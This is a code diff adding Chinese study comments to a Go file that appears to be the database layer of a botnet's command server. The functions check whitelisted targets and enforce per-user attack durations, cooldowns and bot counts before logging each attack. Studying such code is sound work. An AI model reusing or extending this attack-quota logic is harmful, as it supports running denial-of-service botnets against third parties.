@@ -5,7 +5,7 @@ import (
     "fmt"
     "net"
     "encoding/binary"
-    _ "github.com/go-sql-driver/mysql"
+    _ "github.com/go-sql-driver/mysql"  //这样引用是几个意思？
     "time"
     "errors"
 )
@@ -99,7 +99,7 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
     return false
 }
 
-//
+//能否发起攻击
 func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
     rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
     defer rows.Close()
@@ -112,23 +112,23 @@ func (this *Database) CanLaunchAttack(username string, duration uint32, fullComm
     }
     rows.Scan(&userId, &durationLimit, &cooldown)
 
-    if durationLimit != 0 && duration > durationLimit {
+    if durationLimit != 0 && duration > durationLimit {  //申请攻击的时间超过最大限制
         return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
     }
-    rows.Close()
+    rows.Close()  //已经有rows.Close，再调用一次没关系吗
 
-    if allowConcurrent == 0 {
+    if allowConcurrent == 0 {//allowConcurrent是啥     concurrent 同时发生的
         rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
         if err != nil {
             fmt.Println(err)
         }
         if rows.Next() {
             var timeSent, historyDuration uint32
-            rows.Scan(&timeSent, &historyDuration)
+            rows.Scan(&timeSent, &historyDuration)//还没到cooldown时间
             return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent + historyDuration + cooldown) - uint32(time.Now().Unix())))
         }
     }
-
+    //更新攻击历史信息
     this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
     return true, nil
 }
